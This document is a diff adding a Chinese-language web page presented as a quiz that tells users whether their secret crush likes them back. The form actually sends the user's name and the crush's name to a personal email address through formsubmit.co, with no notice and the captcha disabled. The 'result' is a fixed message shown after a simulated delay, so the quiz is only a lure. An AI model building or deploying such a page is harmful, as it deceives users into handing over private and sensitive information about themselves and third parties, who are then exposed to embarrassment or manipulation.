@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>测你暗恋的人是不是也喜欢你？</title>
+  <style>
+    body {
+      font-family: "微软雅黑", sans-serif;
+      background: #ffeaf0;
+      color: #333;
+      text-align: center;
+      padding: 50px;
+    }
+    .container {
+      max-width: 400px;
+      margin: auto;
+      background: #fff;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+    }
+    input, button {
+      width: 90%;
+      padding: 12px;
+      margin: 10px 0;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    button {
+      background-color: #ff4081;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    .result {
+      margin-top: 20px;
+      font-size: 18px;
+      color: #d63384;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>测一测你暗恋的人是不是也喜欢你？</h2>
+    <form action="https://formsubmit.co/chweiy@qq.com" method="POST" id="loveForm">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="text" name="你的名字" placeholder="请输入你的名字" required />
+      <input type="text" name="你暗恋的人是" placeholder="请输入你暗恋的人名字" required />
+      <button type="submit" onclick="showResult()">开始测试</button>
+    </form>
+    <div class="result" id="resultText">
+      正在计算匹配度... ❤️<br/>你和TA真的很有缘呢～
+    </div>
+  </div>
+
+  <script>
+    function showResult() {
+      setTimeout(() => {
+        document.getElementById("resultText").style.display = "block";
+      }, 800); // 模拟“计算”过程
+    }
+  </script>
+</body>
+</html>
